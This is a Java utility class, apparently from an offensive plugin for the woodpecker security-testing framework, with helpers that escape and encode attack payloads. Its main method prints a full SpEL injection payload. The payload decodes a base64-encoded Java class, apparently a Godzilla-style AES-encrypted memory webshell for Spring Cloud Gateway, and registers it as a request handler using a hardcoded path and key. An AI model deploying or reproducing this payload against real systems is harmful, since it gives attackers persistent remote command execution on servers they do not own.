package me.gv7.woodpecker.plugin.utils;

import java.io.IOException;
import java.io.StringWriter;
import java.io.Writer;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Locale;

public class Utils {
    public static String escape(String payload) {
        return payload.replace("'", "\\'");
    }

    public static String escape(String payload, String c) {
        return payload.replace(c, "\\" + c);
    }

    public static String getFullClassName(byte[] classFile) throws Exception {
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        method.setAccessible(true);
        Class clazz = (Class) method.invoke(new javax.management.loading.MLet(new URL[0], Thread.currentThread().getContextClassLoader()), classFile, 0, classFile.length);
        return clazz.getName();
    }

    public static String encoder(String text, String encoder) {
        try {
            switch (encoder) {
                case "json":
                    return Utils.escape(text, "\"").replace("\r", "\\r").replace("\n", "\\n");
                case "url":
                    return URLEncoder.encode(text, "utf-8");
                case "unicode":
                    return Utils.escapeJavaStyleString(text);
                default:
                    return text;
            }
        } catch (Exception ex) {
            return text;
        }
    }

    public static void main(String[] args) throws IOException {
        System.out.println( escapeJavaStyleString("#{T(org.springframework.cglib.core.ReflectUtils).defineClass('SimpleHandler',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQBCQoARACDCQALAIQKAAYAhQgAVAcAhgcAhwcAiAcAiQoABQCKCgAHAIsHAQcIAFYHAGgHAI0HAI4KAI8AkAoADwCRCgAIAJILAJMAlAoACwCDCgAHAJUIAJYHAJcKABcAmAgAmQgAmgoAmwCcBwCdCgAPAJ4KABwAnwoAmwCgCgCbAKELAA4AogsAowCkCABzCwClAKYHAKcHAKgDf////woAJgCpCgAmAKoJAKsArAoAJQCtCgALAK4JAAsArwgAsAsAsQCyCgALALMLALEAtAgAtQgAtgoABQC3BwC4CgA1AIMKAAYAuQoACwC6CgAGALsKADUAvAgAvQoAFwC+CAC/CgAFAMAKAMEAiwoAwQDCBwDDCgBBAIMIAMQHAMUBAAVzdG9yZQEAD0xqYXZhL3V0aWwvTWFwOwEACVNpZ25hdHVyZQEANUxqYXZhL3V0aWwvTWFwPExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0Oz47AQACeGMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAMkxtcy9jbG91ZC9nYXRld2F5L1NwcmluZ1JlcXVlc3RNYXBwaW5nR29kemlsbGFSYXc7AQAIZG9JbmplY3QBAEooTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFXJlZ2lzdGVySGFuZGxlck1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBABJyZXF1ZXN0TWFwcGluZ0luZm8BAENMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQADbXNnAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAA29iagEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABHBhdGgBAANrZXkBAA1TdGFja01hcFRhYmxlBwCXBwCOAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQABcwEAAltCAQABbQEAAVoHAQcHAMYBAF8oW0JMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmVyL1NlcnZlcldlYkV4Y2hhbmdlOylMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5OwEAAWYBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQAEX251bQEAAUkBAAdjdXJyZW50AQAEYm9keQEABXBkYXRhAQAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTsHAI0BACJSdW50aW1lVmlzaWJsZVBhcmFtZXRlckFubm90YXRpb25zAQA1TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0Qm9keTsBAAhyZXF1aXJlZAMAAAAAAQALaW5pdFNlc3Npb24BABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBAAVzTWFwRgEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBACRTcHJpbmdSZXF1ZXN0TWFwcGluZ0dvZHppbGxhUmF3LmphdmEMAEsATAwASQBKDADHAMgBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQBBb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MAMkAygwAywDMAQAwbXMvY2xvdWQvZ2F0ZXdheS9TcHJpbmdSZXF1ZXN0TWFwcGluZ0dvZHppbGxhUmF3AQAwb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmVyL1NlcnZlcldlYkV4Y2hhbmdlAQAQamF2YS9sYW5nL1N0cmluZwcAzQwAzgDPDABLANAMANEA1AcA1QwA1gDXDADYANkBAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24MANoATAEADGluamVjdC1lcnJvcgEAA0FFUwcAxgwA2wDcAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwA3QDeDABLAN8MAOAA4QwA4gDjDADkAOUHAOYMAOcA6AcA6QwA6gDrAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5AQARamF2YS9sYW5nL0ludGVnZXIMAOwA7QwA7gDvBwDwDADxAPIMAEsA8wwAYwBkDABFAEYBAAdwYXlsb2FkBwD0DAD1AOsMAPYA9wwA+AD5AQACLTEBAApwYXJhbWV0ZXJzDAD6APsBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwA/AD9DAB8AH0MAP4A/wwBAADeAQABMAwBAQD/AQAKc2Vzc2lvbk1hcAwBAgEDBwEEDAEFAQYBABFqYXZhL3V0aWwvSGFzaE1hcAEAEDNjNmUwYjhhOWMxNTIyNGEBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBACRvcmcvc3ByaW5nZnJhbWV3b3JrL3V0aWwvQmFzZTY0VXRpbHMBABBkZWNvZGVGcm9tU3RyaW5nAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEABShbQilWAQAFcGF0aHMBAAdCdWlsZGVyAQAMSW5uZXJDbGFzc2VzAQBgKFtMamF2YS9sYW5nL1N0cmluZzspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBJb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcgEABWJ1aWxkAQBFKClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEACmdldFJlcXVlc3QBAD4oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvc2VydmVyL3JlYWN0aXZlL1NlcnZlckh0dHBSZXF1ZXN0OwEAOm9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9zZXJ2ZXIvcmVhY3RpdmUvU2VydmVySHR0cFJlcXVlc3QBAA5nZXRRdWVyeVBhcmFtcwEAKigpTG9yZy9zcHJpbmdmcmFtZXdvcmsvdXRpbC9NdWx0aVZhbHVlTWFwOwEAJm9yZy9zcHJpbmdmcmFtZXdvcmsvdXRpbC9NdWx0aVZhbHVlTWFwAQAIZ2V0Rmlyc3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBACNvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1cwEAAk9LAQAlTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOwEAOihMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7KVYBAA1qYXZhL3V0aWwvTWFwAQADZ2V0AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmpl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'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping, 'L0tUTXlWbG9lZng=', '00bfaaf48a05560c')}"));
    }
    public static String escapeJavaStyleString(String str) throws IOException {
        if (str == null) {
            return null;
        } else {
            StringWriter writer = new StringWriter(str.length() * 2);
            escapeJavaStyleString(writer, str);
            return writer.toString();
        }
    }

    public static void escapeJavaStyleString(Writer out, String str) throws IOException {
        if (out == null) {
            throw new IllegalArgumentException("The Writer must not be null");
        } else if (str != null) {
            int sz = str.length();
            for (int i = 0; i < sz; ++i) {
                char ch = str.charAt(i);
                if (ch > 4095) {
                    out.write("\\u" + hex(ch));
                } else if (ch > 255) {
                    out.write("\\u0" + hex(ch));
                } else if (ch > 127) {
                    out.write("\\u00" + hex(ch));
                } else if (ch < ' ') {
                    if (ch > 15) {
                        out.write("\\u00" + hex(ch));
                    } else {
                        out.write("\\u000" + hex(ch));
                    }
                } else {
                    out.write("\\u00" + hex(ch));
                }
            }

        }
    }

    private static String hex(char ch) {
        return Integer.toHexString(ch).toUpperCase(Locale.ENGLISH);
    }
}
